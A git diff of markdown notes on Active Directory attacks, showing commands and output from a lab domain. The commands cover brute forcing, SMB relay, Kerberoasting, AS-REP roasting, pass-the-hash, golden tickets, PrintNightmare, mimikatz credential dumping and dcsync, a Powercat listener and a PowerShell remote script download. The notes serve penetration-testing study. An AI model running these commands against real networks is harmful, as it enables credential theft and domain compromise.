@@ -1,122 +1,122 @@
 This is a collection of notes about active directory and (post)exploitation
 
-- [USEFULL TOOLS](#usefull-tools)
-  * [Metasploit](#metasploit)
-  * [Bloodhound](#bloodhound)
-  * [Sharphound](#sharphound)
-  * [Covenant](#covenant)
-  * [Powerview](#powerview)
-  * [Mimikatz](#mimikatz)
-  * [Kerbrute](#kerbrute)
-  * [Rubeus](#rubeus)
-  * [Sysinternals](#sysinternals)
-  * [UACME](#uacme)
-  * [Nishang](#nishang)
-  * [Active Directory Enumeration](#active-directory-enumeration)
-  * [Firewall](#firewall)
-  * [Powershell Kungfu](#powershell-kungfu)
-    + [Powershell Download](#powershell-download)
-    + [Read Local Sam Hashes](#read-local-sam-hashes)
-    + [Powercat](#powercat)
-  * [Check smb version and server info](#check-smb-version-and-server-info)
-    + [nmap](#nmap)
-    + [metasploit](#metasploit)
-    + [crackmapexec](#crackmapexec)
-  * [Enum Local users](#enum-local-users)
-    + [rpcclient](#rpcclient)
-    + [impacket-lookupsid](#impacket-lookupsid)
-  * [Bruteforce](#bruteforce)
-    + [Rdp Brute Force](#rdp-brute-force)
-    + [Kerbrute](#kerbrute-1)
-    + [Metasploit](#metasploit-1)
-    + [Crackmapexec](#crackmapexec)
-  * [Enum Shares](#enum-shares)
-    + [smbclient](#smbclient)
-    + [smbmap](#smbmap)
-    + [smb_enumshares](#smb-enumshares)
-    + [crackmaexec](#crackmaexec)
-  * [Checking your rights for remote device](#checking-your-rights-for-remote-device)
-    + [SMB_Login](#smb-login)
-    + [Crackmapexec](#crackmapexec-1)
-  * [Sharphound](#sharphound-1)
-  * [Bloodhound](#bloodhound-1)
-  * [SMB Relay Attack](#smb-relay-attack)
-  * [AS-REP Roasting](#as-rep-roasting)
-    + [Generate vulnerability](#generate-vulnerability)
-    + [Exploitation](#exploitation)
-  * [Kerberoasting](#kerberoasting)
-    + [Generate vulnerability](#generate-vulnerability-1)
-    + [Exploitation](#exploitation-1)
-  * [WinRS](#winrs)
-  * [Evil-WinRM](#evil-winrm)
-  * [Impacket](#impacket)
-    + [wmiexec](#wmiexec)
-    + [smbexec](#smbexec)
-    + [psexec](#psexec)
-  * [Pass the Hash](#pass-the-hash)
-  * [Pass the Ticket](#pass-the-ticket)
-  * [Print nightmare LPE](#print-nightmare-lpe)
-  * [Printer Bug](#printer-bug)
-  * [Abusing ACL](#abusing-acl)
-    + [GenericALL-User](#genericall-user)
-    + [GenericALL-Group](#genericall-group)
-  * [Golden Ticket](#golden-ticket)
-  * [Machine Domain admin-Use machine NTLM hash](#machine-domain-admin-use-machine-ntlm-hash)
-  * [Credential Collection](#credential-collection)
-    + [mimikatz lsass.DMP local analyze](#mimikatz-lsassdmp-local-analyze)
-    + [mimikatz logonpasswords](#mimikatz-logonpasswords)
-    + [mimikatz dcsync](#mimikatz-dcsync)
+- [Metasploit](#metasploit)
+- [Bloodhound](#bloodhound)
+- [Sharphound](#sharphound)
+- [Covenant](#covenant)
+- [Powerview](#powerview)
+- [Mimikatz](#mimikatz)
+- [Kerbrute](#kerbrute)
+- [Rubeus](#rubeus)
+- [Sysinternals](#sysinternals)
+- [UACME](#uacme)
+- [Nishang](#nishang)
+- [Active Directory Enumeration](#active-directory-enumeration)
+- [Firewall](#firewall)
+- [Powershell Kungfu](#powershell-kungfu)
+  * [Powershell Download](#powershell-download)
+  * [Read Local Sam Hashes](#read-local-sam-hashes)
+  * [Powercat](#powercat)
+- [Check smb version and server info](#check-smb-version-and-server-info)
+  * [nmap](#nmap)
+  * [metasploit](#metasploit)
+  * [crackmapexec](#crackmapexec)
+- [Enum Local users](#enum-local-users)
+  * [rpcclient](#rpcclient)
+  * [impacket-lookupsid](#impacket-lookupsid)
+- [Bruteforce](#bruteforce)
+  * [Rdp Brute Force](#rdp-brute-force)
+  * [Kerbrute](#kerbrute-1)
+  * [Metasploit](#metasploit-1)
+  * [Crackmapexec](#crackmapexec)
+- [Enum Shares](#enum-shares)
+  * [smbclient](#smbclient)
+  * [smbmap](#smbmap)
+  * [smb_enumshares](#smb-enumshares)
+  * [crackmaexec](#crackmaexec)
+- [Checking your rights for remote device](#checking-your-rights-for-remote-device)
+  * [SMB_Login](#smb-login)
+  * [Crackmapexec](#crackmapexec-1)
+- [Sharphound](#sharphound-1)
+- [Bloodhound](#bloodhound-1)
+- [SMB Relay Attack](#smb-relay-attack)
+- [AS-REP Roasting](#as-rep-roasting)
+  * [Generate vulnerability](#generate-vulnerability)
+  * [Exploitation](#exploitation)
+- [Kerberoasting](#kerberoasting)
+  * [Generate vulnerability](#generate-vulnerability-1)
+  * [Exploitation](#exploitation-1)
+- [WinRS](#winrs)
+- [Evil-WinRM](#evil-winrm)
+- [Impacket](#impacket)
+  * [wmiexec](#wmiexec)
+  * [smbexec](#smbexec)
+  * [psexec](#psexec)
+- [Pass the Hash](#pass-the-hash)
+- [Pass the Ticket](#pass-the-ticket)
+- [Print nightmare LPE Sharpprintnightmare](#print-nightmare-lpe-sharpprintnightmare)
+- [Print nightmare LPE Powershell](#print-nightmare-lpe-powershell)
+- [Printer Bug](#printer-bug)
+- [Abusing ACL](#abusing-acl)
+  * [GenericALL-User](#genericall-user)
+  * [GenericALL-Group](#genericall-group)
+- [Golden Ticket](#golden-ticket)
+- [Machine Domain admin-Use machine NTLM hash](#machine-domain-admin-use-machine-ntlm-hash)
+- [Credential Collection](#credential-collection)
+  * [mimikatz lsass.DMP local analyze](#mimikatz-lsassdmp-local-analyze)
+  * [mimikatz logonpasswords](#mimikatz-logonpasswords)
+  * [mimikatz dcsync](#mimikatz-dcsync)
 
 <small><i><a href='http://ecotrust-canada.github.io/markdown-toc/'>Table of contents generated with markdown-toc</a></i></small>
 
 
 
-# USEFULL TOOLS
+# Metasploit
 
-## Metasploit
-## Bloodhound
+
+# Bloodhound
 
 	https://github.com/BloodHoundAD/BloodHound
 	
-## Sharphound
+# Sharphound
 
 	https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors
 	
-## Covenant
+# Covenant
 
 	https://github.com/cobbr/Covenant
 
-## Powerview
+# Powerview
 
 	https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
 
-## Mimikatz
+# Mimikatz
 	https://github.com/gentilkiwi/mimikatz
 	
-## Kerbrute
+# Kerbrute
 
 	https://github.com/ropnop/kerbrute
 	
-## Rubeus
+# Rubeus
 
 	https://github.com/GhostPack/Rubeus
 
-## Sysinternals
+# Sysinternals
 
 	https://docs.microsoft.com/en-us/sysinternals/downloads/
 
 
-## UACME
+# UACME
 
 	https://github.com/hfiref0x/UACME
 	
 
-## Nishang
+# Nishang
 
 	https://github.com/samratashok/nishang
 
 
-## Active Directory Enumeration
+# Active Directory Enumeration
 
 Get current Domain and Domain controller
 
@@ -275,7 +275,7 @@ Get GPP password
 	Cpassword : VPe/o9YRyz2cksnYRbNeQoC7S+/HhWsGEcuvup04p1E
 
 
-## Firewall
+# Firewall
 
 check firewall status
 
@@ -313,9 +313,9 @@ Disable firewall
 	State                                 OFF
 	Ok.
 
-## Powershell Kungfu
+# Powershell Kungfu
 
-### Powershell Download
+## Powershell Download
 
 There is nothing on disk in this option
 
@@ -330,7 +330,7 @@ PowerShell  one liner download (4.0 & 5.0)
 	Invoke-WebRequest "http://server/file.ps1" -OutFile "file.ps1"  
 
 
-### Read Local Sam Hashes
+## Read Local Sam Hashes
 
 Download script from here : https://github.com/samratashok/nishang/blob/master/Gather/Get-PassHashes.ps1
 
@@ -345,7 +345,7 @@ import and run script
 	win10:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 	
 
-### Powercat
+## Powercat
 
 Download script from here : https://github.com/besimorhino/powercat/blob/master/powercat.ps1
 
@@ -361,9 +361,9 @@ connect from another device
 	└─$ nc 192.168.200.112 4444                                    
 	i connected from kali
 
-## Check smb version and server info
+# Check smb version and server info
 
-### nmap
+## nmap
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ sudo nmap -p445 --script smb-protocols 192.168.200.100 -O -Pn                                                                                   130 ⨯
@@ -396,7 +396,7 @@ connect from another device
 
 
 
-### metasploit
+## metasploit
 
 	msf6 auxiliary(scanner/smb/smb_version) > run
 	[*] 192.168.200.100:445   - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.0.2) (signatures:required) (uptime:15m 42s) (guid:{0e6e2ca3-2bd4-4307-8e35-70564748263c}) (authentication domain:VALHALLA)
@@ -406,16 +406,16 @@ connect from another device
 	msf6 auxiliary(scanner/smb/smb_version) >
 
 
-### crackmapexec
+## crackmapexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 
 	SMB         192.168.200.100 445    ODIN             [*] Windows Server 2012 R2 Standard Evaluation 9600 x64 (name:ODIN) (domain:valhalla.local) (signing:True) (SMBv1:True)
 
 
-## Enum Local users
+# Enum Local users
 
-### rpcclient
+## rpcclient
 
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
@@ -440,7 +440,7 @@ connect from another device
 	user:[mrblack] rid:[0x849]
 
 
-### impacket-lookupsid
+## impacket-lookupsid
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-lookupsid valhalla/thor:Pass123\!@192.168.200.110
@@ -455,9 +455,9 @@ connect from another device
 	1000: THOR\win7 (SidTypeUser)
 
 
-## Bruteforce
+# Bruteforce
 
-### Rdp Brute Force
+## Rdp Brute Force
 
 brute force with less privilege
 
@@ -494,7 +494,7 @@ Brute force with privilege account
 
 
 
-### Kerbrute
+## Kerbrute
 
 Brute force usernames from DC (There is no log for this scan)
 
@@ -538,7 +538,7 @@ Bruteforce password for single user (There is no log for this scan)
 	2021/08/19 10:46:18 >  Done! Tested 500 logins (1 successes) in 1.019 seconds
 
 
-### Metasploit
+## Metasploit
 
 	msf6 auxiliary(scanner/smb/smb_login) > set pass_file pword.txt
 	pass_file => pword.txt
@@ -554,7 +554,7 @@ Bruteforce password for single user (There is no log for this scan)
 	[*] Auxiliary module execution completed
 	
 	
-### Crackmapexec
+## Crackmapexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 -u thor -p pword.txt -d valhalla.local          
@@ -567,9 +567,9 @@ Bruteforce password for single user (There is no log for this scan)
 
 
 
-## Enum Shares
+# Enum Shares
 
-### smbclient
+## smbclient
 
 Detect
 
@@ -605,7 +605,7 @@ Connect
 	smb: \> 
 
 
-### smbmap
+## smbmap
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ smbmap -H 192.168.200.100 -d valhalla.local -u testuser -p Pass123!
@@ -620,7 +620,7 @@ Connect
 			SYSVOL                                                  READ ONLY       Logon server share 
 
 
-### smb_enumshares
+## smb_enumshares
 
 	msf6 auxiliary(scanner/smb/smb_enumshares) > set smbuser thor
 	smbuser => thor
@@ -644,7 +644,7 @@ Connect
 	[*] Auxiliary module execution completed
 
 
-### crackmaexec
+## crackmaexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb 192.168.200.100 -u thor -p Pass123! -d valhalla.local --shares
@@ -661,9 +661,9 @@ Connect
 
 
 
-## Checking your rights for remote device
+# Checking your rights for remote device
 
-### SMB_Login
+## SMB_Login
 
 	msf6 auxiliary(scanner/smb/smb_login) > set smbuser administrator
 	smbuser => administrator
@@ -678,7 +678,7 @@ Connect
 	[*] Auxiliary module execution completed
 	msf6 auxiliary(scanner/smb/smb_login) > 
 	
-### Crackmapexec
+## Crackmapexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ crackmapexec smb valhalla.local -u administrator -p Pass123!                                                                                   1 ⚙
@@ -687,7 +687,7 @@ Connect
  
 	
 
-## Sharphound
+# Sharphound
 
 If you want to run Sharphound from a PC that is not joined to the target domain, open a command prompt and run:
 
@@ -702,7 +702,7 @@ Then import Sharpound and run it as normal.
 	.\SharpHound.exe --CollectionMethod all -d valhalla.local
 	
 
-## Bloodhound
+# Bloodhound
 
 	sudo apt-get install bloodhound
 
@@ -712,7 +712,7 @@ Then import Sharpound and run it as normal.
 
 
 
-## SMB Relay Attack
+# SMB Relay Attack
 
 SMB sign should be disabled
 
@@ -914,19 +914,19 @@ ntlmrelayx shell
 	[*] Done dumping SAM hashes for host: 192.168.200.110
 	[*] Stopping service RemoteRegistry
 
-## AS-REP Roasting
+# AS-REP Roasting
 
 If Kerberos Pre-Authentication is enabled, a [Timestamp](https://ldapwiki.com/wiki/Timestamp) will be [encrypted](https://ldapwiki.com/wiki/Encrypted) using the user's [password](https://ldapwiki.com/wiki/Password) [hash](https://ldapwiki.com/wiki/Hash) as an [encryption](https://ldapwiki.com/wiki/Encryption) [key](https://ldapwiki.com/wiki/Key). If the [KDC](https://ldapwiki.com/wiki/KDC) reads a valid time when using the user's password hash, which is available in the [Microsoft Active Directory](https://ldapwiki.com/wiki/Microsoft%20Active%20Directory), to decrypt the [Timestamp](https://ldapwiki.com/wiki/Timestamp), the [KDC](https://ldapwiki.com/wiki/KDC) knows that request isn't a replay of a previous request.
 
 Without Kerberos Pre-Authentication a [malicious](https://ldapwiki.com/wiki/Malicious) [attacker](https://ldapwiki.com/wiki/Attacker) can directly send a dummy request for [authentication](https://ldapwiki.com/wiki/Authentication). The [KDC](https://ldapwiki.com/wiki/KDC) will return an [encrypted](https://ldapwiki.com/wiki/Encrypted) [TGT](https://ldapwiki.com/wiki/TGT) and the [attacker](https://ldapwiki.com/wiki/Attacker) can brute force it offline.
 
-### Generate vulnerability
+## Generate vulnerability
 
 Activate
 
 ![image](https://user-images.githubusercontent.com/13157446/129409430-5b5cc59e-5ed3-4370-b8bf-f1fe1a00ef98.png)
 
-### Exploitation
+## Exploitation
 
 
 Run Rubeus
@@ -968,14 +968,14 @@ Crack it
 
 	hashcat -m 18200 hash.txt 500.txt --force 
 
-## Kerberoasting
+# Kerberoasting
 
 
 During this attack, an adversary attempts to enumerate the Service Principal Name (SPNs) of service accounts through crafted LDAP queries
 
 
 
-### Generate vulnerability
+## Generate vulnerability
 
 Create OU for service accounts
 
@@ -996,7 +996,7 @@ Set SPN for service account
 ![Pasted image 20210813214029](https://user-images.githubusercontent.com/13157446/129405121-db8df286-38e3-4d16-a601-3bde3cf1da20.png)
 
 
-### Exploitation
+## Exploitation
 
 Enum SPN users with Rubeus
 
@@ -1098,7 +1098,7 @@ Crack with hashcat
 	hashcat -m 13100 hash.txt 500.txt --force 
 
 
-## WinRS
+# WinRS
 
 	PS C:\Users\testuser> winrs.exe -r:odin.valhalla.local -u:administrator -p:Pass123! "cmd /c whoami & hostname & ipconfig
 	"
@@ -1121,7 +1121,7 @@ Crack with hashcat
 	   Media State . . . . . . . . . . . : Media disconnected
 	   Connection-specific DNS Suffix  . :
 
-## Evil-WinRM
+# Evil-WinRM
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ evil-winrm -i 192.168.200.100 -u administrator -p Pass123!                                                                                     1 ⚙
@@ -1146,9 +1146,9 @@ Crack with hashcat
 	*Evil-WinRM* PS C:\Users\Administrator\Documents> 
 
 
-## Impacket
+# Impacket
 
-### wmiexec
+## wmiexec
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-wmiexec valhalla/administrator:Pass123\!@192.168.200.100                                                                 1 ⨯ 1 ⚙
 	Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
@@ -1159,7 +1159,7 @@ Crack with hashcat
 	C:\>whoami
 	valhalla\administrator
 
-### smbexec
+## smbexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-smbexec valhalla/administrator:Pass123\!@192.168.200.100                                                                     1 ⚙
@@ -1170,7 +1170,7 @@ Crack with hashcat
 	nt authority\system
 
 
-### psexec
+## psexec
 
 	┌──(kali㉿kali)-[~/Desktop/ADAbuse]
 	└─$ /usr/bin/impacket-psexec valhalla/administrator:Pass123\!@192.168.200.100                                                                  1 ⨯ 1 ⚙
@@ -1189,7 +1189,7 @@ Crack with hashcat
 	C:\Windows\system32>whoami
 	nt authority\system
 
-## Pass the Hash
+# Pass the Hash
 
 open mimikatz on Admin or SYSTEM privilege. Get password and hash from memory
 
@@ -1313,7 +1313,7 @@ if we want a remote shell we can use psexec.exe
 	   Connection-specific DNS Suffix  . :
 
 
-## Pass the Ticket
+# Pass the Ticket
 
 firstly administrator should RDP to remote host so TGT will be stored inside memory
 
@@ -1349,11 +1349,11 @@ check you access
 ![image](https://user-images.githubusercontent.com/13157446/130322707-c5e5d93c-cf17-46f7-9b08-a675ec60a83d.png)
 
 
-## Print nightmare LPE Sharpprintnightmare
+# Print nightmare LPE Sharpprintnightmare
 
 to do
 
-## Print nightmare LPE Powershell
+# Print nightmare LPE Powershell
 
 Download script from here : https://github.com/gyaansastra/Print-Nightmare-LPE
 
@@ -1389,7 +1389,7 @@ import and execute script
 	PS C:\Users\testuser\Desktop\share>
 
 
-## Printer Bug
+# Printer Bug
 
 there is 2 device :
 
@@ -1469,9 +1469,9 @@ Rest
 
 https://github.com/vanhohen/ADNinja/blob/main/Guideline.md#pass-the-ticket
 
-## Abusing ACL
+# Abusing ACL
 
-### GenericALL-User
+## GenericALL-User
 
 We will check bloodhound and user has GenericAll rights for another user
 
@@ -1495,7 +1495,7 @@ Fail with another user
 	PS C:\Users\testuser\Desktop\sharphound>
 
 
-### GenericALL-Group
+## GenericALL-Group
 
 Groups for dontmindme user 
 
@@ -1596,7 +1596,7 @@ try to add with idontmind user
 
 
 
-## Golden Ticket
+# Golden Ticket
 
 activate debug mode
 
@@ -1694,7 +1694,7 @@ Access remote pc
 ![image](https://user-images.githubusercontent.com/13157446/129424166-5296aee2-0d58-4906-8331-19c1d34e3526.png)
 
 
-## Machine Domain admin-Use machine NTLM hash
+# Machine Domain admin-Use machine NTLM hash
 
 	We need Local Admin rights on machine
 
@@ -1796,9 +1796,9 @@ regular cmd shell (access denied)
 ![image](https://user-images.githubusercontent.com/13157446/129442954-661ab321-9c6b-4a35-9d6f-48e21d0821d1.png)
 
 
-## Credential Collection
+# Credential Collection
 
-### mimikatz lsass.DMP local analyze
+## mimikatz lsass.DMP local analyze
 
 if we cant run mimikatz on target machine, we can get dump of lsass process and analyze local computer.
 
@@ -1854,18 +1854,18 @@ Get passwords
 
 
 
-### mimikatz logonpasswords
+## mimikatz logonpasswords
 
  cmd needs to run administrators rights / locally
 
 	PS C:\Users\thor\Desktop\mimikatz\x64> .\mimikatz.exe
 
-	  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
-	 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
-	 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
-	 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
-	 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gm
-	  '#####'        > https://pingcastle.com / https://mysmartlogon
+	  .###.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+	 .# ^ #.  "A La Vie, A L'Amour" - (oe.eo)
+	 # / \ #  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilki
+	 # \ / #       > https://blog.gentilkiwi.com/mimikatz
+	 '# v #'       Vincent LE TOUX             ( vincent.letoux@gm
+	  '###'        > https://pingcastle.com / https://mysmartlogon
 
 	mimikatz # privilege::debug
 	Privilege '20' OK
@@ -1902,7 +1902,7 @@ Get passwords
 			credman :
 			
 			
-### mimikatz dcsync
+## mimikatz dcsync
 
 authuser should be admin rights
 
